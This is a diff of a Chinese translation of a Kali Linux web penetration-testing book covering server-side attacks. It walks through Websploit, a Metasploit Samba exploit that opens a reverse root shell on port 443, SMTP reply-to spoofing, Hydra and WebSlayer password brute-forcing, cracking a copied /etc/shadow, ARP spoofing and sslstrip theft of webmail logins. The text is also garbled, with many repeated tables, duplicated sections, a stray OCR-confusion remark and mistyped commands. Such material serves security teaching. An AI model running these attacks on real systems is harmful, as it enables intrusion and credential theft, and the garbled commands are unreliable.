 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
+
+
+
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
-| 插件 | 状态 | 标识 | 描述 | 更新 |
-| :--- | :--- | :--- | :--- | :--- |
-| Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
-| Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
-| 插件 | 状态 | 标识 | 描述 | 更新 |
-| :--- | :--- | :--- | :--- | :--- |
-| Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
-| Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
-| 插件 | 状态 | 标识 | 描述 | 更新 |
-| :--- | :--- | :--- | :--- | :--- |
-| Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
-| Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
-| 插件 | 状态 | 标识 | 描述 | 更新 |
-| :--- | :--- | :--- | :--- | :--- |
-| Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
-| Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
@@ -1882,30 +1848,30 @@ Zapry 在 Help（帮助） | Check for updates（检查更新）下有一个市�
 
 img/df1fdcde66c92c1fef83bd651dd5ffe3_112.png)
 
-访问 Websploit，进入 Web Applications | Web Application Fuzzers 并选择 websploit。将弹终端窗口并显示 Websploit 横幅。通过输入 `show modules` 可以查看所有可用模块以及运行特定模块所需的参数。
+访问 Websploit，进入 Web Applications | Web Application Fuzzers 并选择 `websploit`。将弹终端窗口并显示 Websploit 横幅。通过输入 `show modules` 可以查看所有可用模块以及运行特定模块所需的参数。
 
 | 网络模块 | 描述 |
 | :--- | :--- |
-| network/arp_dos | ARP 缓存拒绝服务攻击 |
-| network/mfod | 愤怒指头攻击 |
-| network/mite | 间人攻击 |
-| network/algit | 遗在中间的攻击 |
-| network/webkiller | TCP 杀死攻击 |
-| network/fakeupdate | 使用 DNS 欺骗的伪更新攻击 |
-| network/fakeap | 伪造接入点 |
+| `network/arp_dos` | ARP 缓存拒绝服务攻击 |
+| `network/mfod` | 愤怒指头攻击 |
+| `network/mite` | 间人攻击 |
+| `network/algit` | 遗在中间的攻击 |
+| `network/webkiller` | TCP 杀死攻击 |
+| `network/fakeupdate` | 使用 DNS 欺骗的伪更新攻击 |
+| `network/fakeap` | 伪造接入点 |
 
 | 漏洞模块 | 描述 |
 | :--- | :--- |
-| exploit/autopwn | Metasploit 自动破解服务 |
-| exploit/browser_autopwn | Metasploit 浏览器自动破解服务 |
-| exploit/java_applet | Java 攻击（使用 HTML） |
+| `exploit/autopwn` | Metasploit 自动破解服务 |
+| `exploit/browser_autopwn` | Metasploit 浏览器自动破解服务 |
+| `exploit/java_applet` | Java 攻击（使用 HTML） |
 
 | 无线模块 | 描述 |
 | :--- | :--- |
-| wifi/jammer | WiFi 干扰器 |
-| wifi/dos | WiFi DoS 攻击 |
+| `wifi/jammer` | WiFi 干扰器 |
+| `wifi/dos` | WiFi DoS 攻击 |
 
-输入 `USE` 后跟你想要的模块并填写执行所需的条件。例如，要运行 webkiller 模块，输入 `use network/webkiller` 并使用 `SET TARGET` 命令填写攻击目标。输入 `RUN` 执行模块。
+输入 `USE` 后跟你想要的模块并填写执行所需的条件。例如，要运行 `webkiller` 模块，输入 `use network/webkiller` 并使用 `SET TARGET` 命令填写攻击目标。输入 `RUN` 执行模块。
 
 ```
 wsf > use network/webkiller
@@ -1913,10 +1879,6 @@ wsf:Webkiller > set TARGET http://www.thesecurityblogger.com
 TARGET => http://www.thesecurityblogger.com
 wsf:Webkiller > RUN
 ```
-
-
-
-
 
 ## 漏洞利用
 
@@ -1951,7 +1913,7 @@ msf > nmap -n -oX my.xml 172.16.189.0/24
 [*] exec: nmap -n -oX my.xml 172.16.189.0/24
 ```
 
-我们使用创建的 XML 文件将 nmap 的结果导入 Metasploit。我们通过执行以下命令来实现：
+我们使用创建的 XML 文件将 `nmap` 的结果导入 Metasploit。我们通过执行以下命令来实现：
 
 ```
 db_import my.xml
@@ -1978,25 +1940,20 @@ db_import my.xml
 | 172.16.189.21 | 23 | tcp | telnet | | | | open |
 | 172.16.189.25 | 25 | tcp | smtp | | | | open |
 | 172.16.189.37 | 37 | tcp | amqp | | | | open |
-| 172.16.189.1 | 80 | tcp | http | | | | open |
-| 172.16.189.131 | 134 | tcp | netbios | | | | open |
-| 172.16.189.131 | 445 | tcp | microsoft-ds | | | | open |
-| 172.16.189.131 | 5432 | tcp | postgres | | | | open |
-| 172.16.189.131 | 8009 | tcp | ajp | | | | open |
-| 172.16.189.131 | 8188 | tcp | unknown | | | | open |
 
-## 服务器端攻击
 
-你可以使用 `db_nmap` 一步完成完成 nmap 扫描并将 XML 文件导入 Metasploit。在接下来的示例中，我们正在使用 `db_nmap` 扫描一个主机。
 
-```
-msf > db nmap -n -A 172.16.189.131
+# 第3章 服务器端攻击
+
+你可以使用 `db_nmap` 一步完成 `nmap` 扫描并将 XML 文件导入 Metasploit。在接下来的示例中，我们正在使用 `db_nmap` 扫描一个主机。
+
+```msf > db_nmap -n -A 172.16.189.131
 ```
 
 通过执行 `hosts` 和 `services` 命令，我们可以验证 Metasploit 数据库中是否有相关信息。
 
 | host | port | proto | name | state | info |
-|---|---|---|---|---|
+|---|---|---|---|---|---|
 | 172.16.189.131 | 21 | tcp | ftp | open | ProFTPD 1.3.1 |
 | 172.16.189.131 | 22 | tcp | ssh | open | OpenSSH 4.7p1 Debian 2.0 |
 | 172.16.189.131 | 23 | tcp | telnet | open | Linux telnet |
@@ -2013,28 +1970,21 @@ msf > db nmap -n -A 172.16.189.131
 
 我们看到了几个 Samba 漏洞。它们也有排名。我们将使用 `usermap_script` 漏洞。
 
-## 第3 章
-
-（等待，OCR 文本似乎在这里重复或跳转，根据提供的片段继续）
-
 我们使用的命令是：
 
-```
-nmap -n -oX my.xml network
+```nmap -n -oX my.xml network
 ```
 
-```
-msf > nmap -n -oX my.xml 172.16.189.0/24
+```msf > nmap -n -oX my.xml 172.16.189.0/24
 [*] exec: nmap -n -oX my.xml 172.16.189.0/24
 ```
 
-我们使用创建的 XML 文件将 nmap 的结果导入 Metasploit。我们通过执行命令来实现：
+我们使用创建的 XML 文件将 `nmap` 的结果导入 Metasploit。我们通过执行命令来实现：
 
-```
-db_import my.xml
+```db_import my.xml
 ```
 
-快速检查主机命令显示我们的导入成功了，Metasploit 现在拥有了 nmap 数据。
+快速检查主机命令显示我们的导入成功了，Metasploit 现在拥有了 `nmap` 数据。
 
 我们还使用 `services` 命令查看 Metasploit 内的可用服务。这是服务命令的一个示例：
 
@@ -2060,36 +2010,15 @@ db_import my.xml
 | 172.16.189.131 | 8009 | tcp | ajp | | | | open |
 | 172.16.189.131 | 8188 | tcp | unknown | | | | open |
 
-## 服务器端攻击
 
-你可以使用 `db_nmap` 一步完成完成 nmap 扫描并将 XML 文件导入 Metasploit。在接下来的示例中，我们正在使用 `db_nmap` 扫描一个主机。
 
-```
-msf > db nmap -n -A 172.16.189.131
-```
-
-通过执行 `hosts` 和 `services` 命令，我们可以验证 Metasploit 数据库中是否有相关信息。
-
-| host | port | proto | name | state | info |
-|---|---|---|---|---|---|
-| 172.16.189.131 | 21 | tcp | ftp | open | ProFTPD 1.3.1 |
-| 172.16.189.131 | 22 | tcp | ssh | open | OpenSSH 4.7p1 Debian 2.0 |
-| 172.16.189.131 | 23 | tcp | telnet | open | Linux telnet |
-| 172.16.189.131 | 25 | tcp | smtp | open | Postfix smtpd |
-| 172.16.189.131 | 53 | tcp | domain | open | |
-| 172.16.189.131 | 80 | tcp | mysql | open | Apache http 2.2.8 (Ubuntu) |
-| 172.16.189.131 | 139 | tcp | samba | open | Samba 3.X workgroup: WORKGROUP |
-| 172.16.189.131 | 445 | tcp | microsoft-ds | open | MySQL 5.0.51a-3ubuntu5 |
-| 172.16.189.131 | 5432 | tcp | postgresql | open | PostgreSQL DB 8.3.0 - 8.37 |
-| 172.16.189.131 | 8009 | tcp | ajp3 | open | Apache Jserv Protocol v1.3 |
+| IP | Port | Protocol | Service | State | Version |
+| --- | --- | --- | --- | --- | --- |
 | 172.16.189.131 | 8180 | tcp | http | open | Apache Tomcat/Coyote JSP engine 1.1 |
 
 `services` 命令揭示我们正在使用 Samba 文件共享。看看我们是否可以搜索漏洞并利用它。需要注意的是，虽然在这个实例中我们攻击的是一个真实的服务器，但我们并不需要利用 Web 漏洞。攻击者将利用 Web 服务器上运行的所有软件进行访问。
 
 我们看到了几个 Samba 漏洞。它们也有排名。我们将使用 `usermap_script` 漏洞。
-
-
-
 
 一旦设置了负载（payload），我们可以再次发布 `show options` 命令来验证特定于负载的选项。
 
@@ -2109,31 +2038,35 @@ PAYLOAD => cmd/unix/reverse
 msf exploit(usermcript) > show options
 ```
 
-| 正常的 Unix Command Shell, Bind TCP (via P) |
-| :--- |
-| 正常的 Unix Command Shell, Bind TCP (via p) |
-| 正常的 Unix Command Shell, Bind TCP (via R) |
-| 正常的 Unix Command Shell, Bind TCP (via R) |
-| 正常的 Unix Command Shell, 通用命令执行 |
-| 正常的 Unix Command Shell, 双反反 |
-| 正常的 Unix Command Shell, 反向 TCP (vi) |
-| 正常的 Unix Command Shell, 反向 TCP (vi) |
+- 正常的 Unix Command Shell, Bind TCP (via P)
+- 正常的 Unix Command Shell, Bind TCP (via p)
+- 正常的 Unix Command Shell, Bind TCP (via R)
+- 正常的 Unix Command Shell, Bind TCP (via R)
+- 正常的 Unix Command Shell, 通用命令执行
+- 正常的 Unix Command Shell, 双反反
+- 正常的 Unix Command Shell, 反向 TCP (vi)
+- 正常的 Unix Command Shell, 反向 TCP (vi)
 
 我们可以看到这个特定的负载正要求我们设置 `LHOST` 和 `LPORT`。`LHOST` 是本地主机或你的 Metasploit 攻击机。该漏洞会让远程主机连接到托管 Metasploit 的系统，远程主机需要知道你的 IP 地址是什么。
 
 此外，我们还需要设置远程主机与 Metasploit 通信的端口。许多企业环境使用防火墙或路由器限制出站端口。最佳实践是使用常用端口，例如 443 端口，因为它通常保留用于 SSL 流量，而大多数公司允许此类流量出站。此外，发现将 443 作为大多数攻击的 `LPORT` 可以让我们绕过组织可能部署的内部代理工具。
 
-| RHOST 172.16.189.131 yes 目标地址 |
-| RPORT 139 yes 目标端口 |
-| 负载选项 (cmd/unix/reverse): |
-| 名称 当前设置 必须 描述 |
-| LHOST yes 监听地址 |
-| LPORT 4444 yes 监听端口 |
-| 漏洞目标: |
-| 0 自动 |
-| msf exploit(usermcript) > set LHOST 172.16.189.55 |
-| msf exploit(usermcript) > set LPORT 443 |
-| msf exploit(usermcript) > exploit: |
+```
+RHOST 172.16.189.131 yes 目标地址
+RPORT 139 yes 目标端口
+
+负载选项 (cmd/unix/reverse):
+名称    当前设置    必须    描述
+LHOST                  yes     监听地址
+LPORT   4444          yes     监听端口
+
+漏洞目标:
+0   自动
+
+msf exploit(usermcript) > set LHOST 172.16.189.55
+msf exploit(usermcript) > set LPORT 443
+msf exploit(usermcript) > exploit:
+```
 
 ## 服务端攻击
 
@@ -2147,20 +2080,23 @@ LPORT => 443
 msf exploit(userm_script) > exploit
 ```
 
-- [* 启动反向处理程序
-- [* 接受了第一个客户端连接...
-- [* 接受了第二个客户端连接...
-- [* 命令: echo BySs63Katb6fiyQ;
-- [* 正在写入 socket A
-- [* 正在写入 socket B
-- [* 正在从 sockets 读取
-- [* 正在从 socket 读取
-- [* B: "BySs63Katb6fiyQ\n"
-- [* 匹配中:
-- [* A 正在输入...
-- [* 命令会话 1 已打开 (172.16.189.5:443 -> 172.16.189.131:45720) 时间 2023-04-06 15:14:05 -0500
+```
+[*] 启动反向处理程序
+[*] 接受了第一个客户端连接...
+[*] 接受了第二个客户端连接...
+[*] 命令: echo BySs63Katb6fiyQ;
+[*] 正在写入 socket A
+[*] 正在写入 socket B
+[*] 正在从 sockets 读取
+[*] 正在从 socket 读取
+[*] B: "BySs63Katb6fiyQ\n"
+[*] 匹配中:
+[*] A 正在输入...
+[*] 命令会话 1 已打开 (172.16.189.5:443 -> 172.16.189.131:45720) 时间 2023-04-06 15:14:05 -0500
 whoami
 root
+```
+
 如需 http://www.metasploit.com/ 上查看可用选项。
 
 Metasploit 框架中提供了各种漏洞和负载选项。请确保在 http://www.metasploit.com/ 上查看可用选项。
@@ -2179,7 +2115,7 @@ Open Web Application Security Project (OWASP) 是一个全球性的免费开源�
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_120_0.png)
 
-## 服务端攻击
+### 服务端攻击
 
 w3af 将 Log 中显示活动扫描的状态。w3af 将尝试预测完成扫描所需的时间。
 
@@ -2187,16 +2123,13 @@ w3af 将 Log 中显示活动扫描的状态。w3af 将尝试预测完成扫描�
 
 要查看扫描结果，请点击 Results 标签。Results 将提供已识别可能漏洞的详情。Exploit 标签将显示可能的漏洞。（img/df1fdcde66c92c1fef83bd651dd5ffe3_121.png）
 
-
-
-
 ## 第 3 章
 
 如果我们收到了响应，就可以使用 SMTP 命令操控大多数服务器（根据配置和系统类型，某些系统可能不受影响）。在接下来的示例中，我们首先通过 `HELO` 命令告诉服务器我们是谁。接下来，我们可以使用邮件服务器为未来的客户端攻击中继消息。
 
 `HELLO`、`MAIL FROM`、`RCP TO` 和 `DATA` 是唯一必需的字段。你可以使用其他字段来隐藏电子邮件的发送位置，并更改回复地址（reply-to）。一个示例是更改 `Reply-to` 地址，目的是诱导接收者向其他人发送电子邮件。
 
-``````
+```
 MAIL FROM: someone_important@cloudcentrics.com
 ```
 
@@ -2208,14 +2141,16 @@ MAIL FROM: someone_important@cloudcentrics.com
 
 ## Hydra
 
+
+
 Hydra 是由 The Hacker's Choice (THC) 开发的工具，它使用暴力破解方法来测试多种不同的协议。它非常适合攻击邮件系统，因为 Hydra 可以针对特定的 IP 和协议，将邮件系统的 POP3 和 SMTP 管理员账户作为攻击目标。
 
-在启动 Hydra 之前，你应该对目标（如邮件系统）进行**侦察（Reconnaissance）**。第 2 章“侦察”涵盖了漏洞评估工具 Zenmap，它可以用于为 Hydra 收集以下信息：
+在启动 Hydra 之前，你应该对目标（如邮件系统）进行`侦察（Reconnaissance）`。第 2 章“侦察”涵盖了漏洞评估工具 Zenmap，它可以用于为 Hydra 收集以下信息：
 
-- 目标 IP 地址（例如 192.168.1.1）
-- 开放端口（例如端口 80 或 25） 
-- 协议（例如用于 Web 的 HTTP 或用于邮件的 SMTP）
-- 用户名（例如 admin）
+- 目标 IP 地址（例如 `192.168.1.1`）
+- 开放端口（例如端口 `80` 或 `25`）
+- 协议（例如用于 Web 的 `HTTP` 或用于邮件的 `SMTP`）
+- 用户名（例如 `admin`）
 
 ## 服务端攻击
 
@@ -2243,19 +2178,15 @@ Tamper Data 将显示在字段组中输入的信息。即使网站经过加密�
 
 要从 Kali 访问 Hydra，请前往...
 
-
-
-
-
 ## 服务端攻击
 
-在“攻击设置”（Attack Setup）选项卡中，有一个 url 字段，必须填写目标 URI。使用 URL 字段的是请求头（Headers）和 POST 数据输入字段。有一个设置有效负载负载的选项，可以是字典（Dictionary）、范围（Range）或有效负载（Payload）。字典可以是一个包含有效负载的文件，该可以是自定义文件，也可以从可用字典列表中选择。范围设置可用于指定攻击的范围。有效负载设置可以从“有效负载生成器”（Payload Generator）选项卡导入有效负载。接下来的截图显示了 WebSlayer 针对 www.thesecurityblogger.com 的攻击：
+在“攻击设置”`Attack Setup`选项卡中，有一个 `url` 字段，必须填写目标 URI。使用 URL 字段的是请求头`Headers`和 POST 数据输入字段。有一个设置有效负载负载的选项，可以是字典`Dictionary`、范围`Range`或有效负载`Payload`。字典可以是一个包含有效负载的文件，该可以是自定义文件，也可以从可用字典列表中选择。范围设置可用于指定攻击的范围。有效负载设置可以从“有效负载生成器”`Payload Generator`选项卡导入有效负载。接下来的截图显示了 WebSlayer 针对 `www.thesecurityblogger.com` 的攻击：
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_131_0.png)
 
 有效负载生成器是一个你可以用来创建自定义有效负载的工具。你可以加载字典、数字范围、字符块、排列组合、信用卡、用户名和其他设置。你可以拼接它们并创建一个最终的有效负载，然后将其上传到攻击选项卡中进行自定义攻击。
 
-在“有效负载生成器”选项卡中定义范围有效负载的示例见下图。该示例显示了范围从 0 到 1000。一旦选择了范围，我们点击“添加生成器”按钮，这将生成一个时间生成器（Temporal Generator）。将新创建的生成器拖到底部的有效负载创建器，并点击“生成有效负载”。我们现在可以在“攻击设置”选项卡中导入新的有效负载。
+在“有效负载生成器”选项卡中定义范围有效负载的示例见下图。该示例显示了范围从 0 到 1000。一旦选择了范围，我们点击“添加生成器”按钮，这将生成一个时间生成器`Temporal Generator`。将新创建的生成器拖到底部的有效负载创建器，并点击“生成有效负载”。我们现在可以在“攻击设置”选项卡中导入新的有效负载。
 
 ## 第三章
 
@@ -2266,13 +2197,15 @@ WebSlayer
 | 文件 | 范围 | 块 | 排列 | 信用卡 | 用户名 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
 | 范围: | | 到 | 1000 | | |
-| | 宽度: | | | | | |
 
+| | 宽度: | | | | |
 - 固定宽度
 - 添加生成器
 
 你可以制作数字有效负载：
+
 例如从 0 到 31，
+
 或者使用从 000 到 031 的固定宽度。
 
 | 时间生成器 | 最终有效负载: |
@@ -2297,23 +2230,21 @@ WebSlayer
 | | 17 |
 | | 18 |
 | | 19 |
-
 - 删除生成器
 - 从文件添加
 - 保存有效负载
 - 丢有效负载
 - 有效负载创建器 | 有效负载修改器
 
-模式: [@PRange00]
-
+模式: `[@PRange00]`
 - 生成有效负载
 - 删除选择
 
-在将有效负载导入攻击场景或选择字典后，你必须选择 WebSlayer 在何处注入该有效负载。在被攻击的 URL 上放置关键字 FUZZ 即可实现这一点。例如，接下来的截图显示了攻击 URI 字段中的目标为 http://thethesecurityblogger.com/FUZZ，其中 FUZZ 是 WebSlayer 中两个不同的攻击字典：
+在将有效负载导入攻击场景或选择字典后，你必须选择 WebSlayer 在何处注入该有效负载。在被攻击的 URL 上放置关键字 `FUZZ` 即可实现这一点。例如，接下来的截图显示了攻击 URI 字段中的目标为 `http://thethesecurityblogger.com/FUZZ`，其中 `FUZZ` 是 WebSlayer 中两个不同的攻击字典：
 
 - 攻击设置 | 有效负载生成器 | 攻击结果 | 请求者 | 编码器 | 日志 | 帮助
 
-| 2) http://thesecurityblogger.com/FUZZ | 字典 | /test/web/webslayer/wordlistvs/planet.txt |
+| 2) `http://thesecurityblogger.com/FUZZ` | 字典 | `/test/web/webslayer/wordlistvs/planet.txt` |
 | :--- | :--- | :--- |
 | 包含 | 代码: | 行: | | 单词: | | MOD: | 正则表达式 |
 | 时间 | 代码 | 行 | 单词 | 字符 | MOD | 有效负载 | 位置 |
@@ -2328,25 +2259,29 @@ WebSlayer
 
 - 浏览器 | 响应 HTML | 响应源 | 响应头
 - 文档已移动至此处。
-
 - 搜索
+
 攻击已完成
 
 ## 服务端攻击
 
-WebSlayer 可以攻击 HTTP 请求的任何部分，例如头部和身份验证。为了让 WebSlayer 破解 Web 服务器的密码，了解 WebSlayer 最可能不起作用的用户名是非常重要的。你需要捕获请求并尝试登录，以便获取攻击所需的用户代理（user agent）和内容。(img/df1fdcde66c92c1fef83bd651dd5ffe3_133_0.png)
+WebSlayer 可以攻击 HTTP 请求的任何部分，例如头部和身份验证。为了让 WebSlayer 破解 Web 服务器的密码，了解 WebSlayer 最可能不起作用的用户名是非常重要的。你需要捕获请求并尝试登录，以便获取攻击所需的用户代理 `user agent` 和内容。`img/df1fdcde66c92c1fef83bd651dd5ffe3_133_0.png`
 
-Firefox 提供了一个名为 Live Headers 的插件，你可以它在尝试登录目标服务器时收集这些信息。接下来的示例显示了在捕获报头等数据包时使用了错误的密码。(img/df1fdcde66c92c1fef83bd651dd5ffe3_133_1.png) 第三章
+Firefox 提供了一个名为 Live Headers 的插件，你可以它在尝试登录目标服务器时收集这些信息。接下来的示例显示了在捕获报头等数据包时使用了错误的密码。`img/df1fdcde66c92c1fef83bd651dd5ffe3_133_1.png` 第三章
 
-该文档已移动至此处。(img/df1fdcde66c92c1fef83bd651dd5ffe3_133_2.png)
+该文档已移动至此处。`img/df1fdcde66c92c1fef83bd651dd5ffe3_133_2.png`
 
 WebSlayer 提供将有效负载和结果导出为文本和 HTML 格式的能力。日志文件也可以捕获并粘贴到文本文件中。
 
 ## 分析：https://new.myspace.com
+
 分析日期：2013-04-29 23:53:40
 
 | 代码 | 行 | 单词 | URL |
 | :--- | :--- | :--- | :--- |
+
+
+
 | 200 | 648 | 1354 | http://www.thesecurityblogger.com/?Publisher= |
 | 200 | 648 | 1354 | http://www.thesecurityblogger.com/?wp-html-rend= |
 | 200 | 648 | 1354 | http://www.thesecurityblogger.com/?wp-cs-dump= |
@@ -2359,7 +2294,7 @@ WebSlayer 提供将有效负载和结果导出为文本和 HTML 格式的能力�
 | 200 | 648 | 1354 | http://www.thesecurityblogger.com/?wp-ver-info= |
 | 200 | 648 | 1354 | http://www.thesecurityblogger.com/?wp-verify-link= |
 
-服务端攻击
+# 服务端攻击
 
 WebSlayer 能够攻击 HTTP 请求的任何部分，如头部和身份验证。为了让 WebSlayer 破解 Web 服务器的密码，了解 WebSlayer 最可能不起作用的用户名是非常重要的。你需要捕获请求并尝试登录，以便获取攻击所需的用户代理（user agent）和内容。
 
@@ -2376,10 +2311,6 @@ WebSlayer 能够攻击 HTTP 请求的任何部分，如头部和身份验证。�
 WebSlayer 能够攻击 HTTP 请求的任何部分，如头部和身份验证。为了让 WebSlayer 破解 Web 服务器的密码，了解 WebSlayer 最可能不起作用的用户名是非常重要的。
 
 一个 OWASP 项目。
-
-
-
-
 
 ## 服务端攻击
 
@@ -2425,7 +2356,7 @@ wc -l NoDuplicatesOrUpperCase
 Wordlist = $JOHN/password.lst
 ```
 
-将文件列表更改为你的新单词文件的文件名。根据上一个示例，你将其更改为 `Wordlist = NoDuplicatesOrUppercase.list`。新的词汇表文件必须位于 `john.conf` 文件指定的文件夹中。默认路径列在 $JOHN 目录下。
+将文件列表更改为你的新单词文件的文件名。根据上一个示例，你将其更改为 `Wordlist = NoDuplicatesOrUppercase.list`。新的词汇表文件必须位于 `john.conf` 文件指定的文件夹中。默认路径列在 `$JOHN` 目录下。
 
 要使用 John Ripper 处理密码文件，你首先需要将目标文件复制到 John 目录。执行 `cp` 命令将文件移动到 John 目录。例如，要复制 shadow 文件（Linux 系统中常见的密码文件），输入 `cp /etc/shadow`。
 
@@ -2443,7 +2374,7 @@ Wordlist = $JOHN/password.lst
 
 根据定义，中间人攻击是一种主动窃听的形式，攻击者通过与受害者建立独立连接来实现。最常见的中间人攻击发生在系统之间。不久前，在将用户从不安全网页引导到安全网页的系统中发现了一个漏洞。这使得攻击者能够窃听连接到安全服务器的用户。下一节将涵盖该漏洞。常见的中间人攻击将在本书的后续章节中介绍。
 
-## SSL strip
+### SSL strip
 
 2009 年，安全研究人员 Moxie Marlinspike 在 DefCon 上发布了 SSL strip。他引入了 SSL 剥离（SSL stripping）的概念，这是一种中间人攻击，网络攻击者代理用户的 HTTPS 请求，而是通过 HTTP 传输流量，而流量可以被拦截和操纵。SSL strip 自动化了这种攻击，并允许针对安全网站的用户。随后开发了 HTTP 严格传输安全（HSTS）规范来应对这些攻击，然而 HSTS 的部署非常缓慢，SSL 剥离攻击今天仍被广泛使用。
 
@@ -2453,6 +2384,8 @@ Wordlist = $JOHN/password.lst
 root@kali:-# ifconfig | grep "eth"
 eth0 Link encap:Ethernet Haddr 00:0c:29:49:
 ```
+
+
 
 ```bash
 root@kali:-# ifdown eth0
@@ -2497,11 +2430,7 @@ root@kali:~# echo 1 > /proc/sys/ipv4/ip_forward
 arspoof -i eth0 -t victimip default_gateway_ip
 ```
 
-
-
-
-
-# 第3章
+### 第3章
 
 ```
 root@kali: -- 
@@ -2509,16 +2438,17 @@ root@kali:~# iptables -t nat -A PREROUTING -p tcp --destination-port 80 --to-por
 root@kali:~# 
 ```
 
-要禁用 PREROUTING 规则，请将 -A 替换为 -D 以清除所有表规则。
+要禁用 PREROUTING 规则，请将 `-A` 替换为 `-D` 以清除所有表规则。
 
-iptables -t nat -F # 用于刷新 (flush)
-iptables -t nat -L # 用于检查
+`iptables -t nat -F` # 用于刷新 `flush`
 
-arpspoof 有许多选项。你可以使用命令 `man iptables` 来查看更多选项。
+`iptables -t nat -L` # 用于检查
+
+`arpspoof` 有许多选项。你可以使用命令 `man iptables` 来查看更多选项。
 
 现在，你已经准备就绪，可以开始使用 SSL strip 进行去捕获了！
 
-启动 sslstrip，并在新打开的命令行窗口中运行以下命令以在 TCP 端口 10000 上启动 SSL strip 监听：
+启动 `sslstrip`，并在新打开的命令行窗口中运行以下命令以在 TCP 端口 `10000` 上启动 SSL strip 监听：
 
 ```
 sslstrip -l 10000
@@ -2529,9 +2459,9 @@ root@kali:~# sslstrip -l 10000
 sslstrip 0.9 by Moxie Marlinspike running...
 ```
 
-## 服务端攻击
+### 服务端攻击
 
-从目标主机上，访问在线邮件服务，例如 https://www.hotmail.com 并登录。
+从目标主机上，访问在线邮件服务，例如 `https://www.hotmail.com` 并登录。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_143_0.png)
 
@@ -2543,13 +2473,13 @@ root@kali:~# tail -n 50 -f sslstrip.log
 
 现在这里应该会显示 SSL strip 攻击的结果。
 
-## 第3章
+### 第3章
 
 注意，在以下示例中，用户名和密码已被模糊处理，但它们应该以明文形式出现在你的屏幕上。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_144_0.png)
 
-## 总结
+### 总结
 
 本章解释了使用 Kali 中提供的工具攻破漏洞 Web 服务器的各种方法。最常用的方法是使用自动化工具识别已知漏洞，并利用最佳路径获取对目标系统的访问权限。
 
@@ -2559,45 +2489,49 @@ root@kali:~# tail -n 50 -f sslstrip.log
 
 ## 客户端攻击
 
-客户端（client）或主机（host）一术是指用于连接到网络的端点，例如计算机、平板电脑或移动设备。客户端可以向其他客户端提供信息、服务和应用程序，或从另一个系统（如服务器）获取信息。通常，“客户端”一词指的是人们使用的端点。涉及这些意味着这些系统上存在一系列可能的漏洞，以及这些系统是否可以作为获取 Web 应用程序或信息的手段。本章的重点将是识别访问 Web 应用程序的系统、评估系统的漏洞，并在可能的情况下利用这些漏洞。本章将重点关注攻破密码，因为这是保护主机系统最常用的方法。
+客户端 `client` 或主机 `host` 一术是指用于连接到网络的端点，例如计算机、平板电脑或移动设备。客户端可以向其他客户端提供信息、服务和应用程序，或从另一个系统（如服务器）获取信息。通常，“客户端”一词指的是人们使用的端点。涉及这些意味着这些系统上存在一系列可能的漏洞，以及这些系统是否可以作为获取 Web 应用程序或信息的手段。本章的重点将是识别访问 Web 应用程序的系统、评估系统的漏洞，并在可能的情况下利用这些漏洞。本章将重点关注攻破密码，因为这是保护主机系统最常用的方法。
 
 本章将通过介绍如何使用社会工程学攻击主机开始。随后，我们将查看如何识别主机系统上的漏洞，以便你使用书中其他章节介绍的工具来利用这些漏洞。我们将以攻击密码结束，因为它是保护主机系统最常见的手段。
 
-## 社会工程学
+### 社会工程学
 
 对于目标的安全态势而言，人类永远是你最薄弱的环节。你越试图控制终端用户，他们就越尝试绕过策略。你实施的控制越少，策略被遵守的可能性就越低。这在决定如何保护终端用户免受网络威胁时形成了一把双刃剑。黑客知道这一点，并以各种方式针对终端用户，重点在于攻破普通用户的核心特征——**信任**。
 
 社会工程学是操纵他人执行泄露信息行为的艺术。许多客户端攻击基于欺骗终端用户使其系统暴露在攻击之下。社会工程学的范围涵盖了假装成授权员工给某人打电话，到在 Facebook 上发布一个声称是服务但实际上是攻破客户端手段的链接。
 
-发起成功的社会工程学攻击的良好实践是花时间了解你的目标；学习用户如何交流，并尝试融入他们的环境。大多数失败的社会工程学攻击都是由于以通用的格式编写的，而且它们没有包含吸引受害者的强力钩子（hook），就像一封编写糟糕的邮件，声称用户权获得未领取的资金。使用 Facebook 等社交媒体来源是了解目标的绝佳方法，可以了解目标青好的爱好和说话模式。例如，如果一个目标的 Facebook 个人资料布满了运动队标志，那么开发基于折扣运动票的陷阱将是理想的。
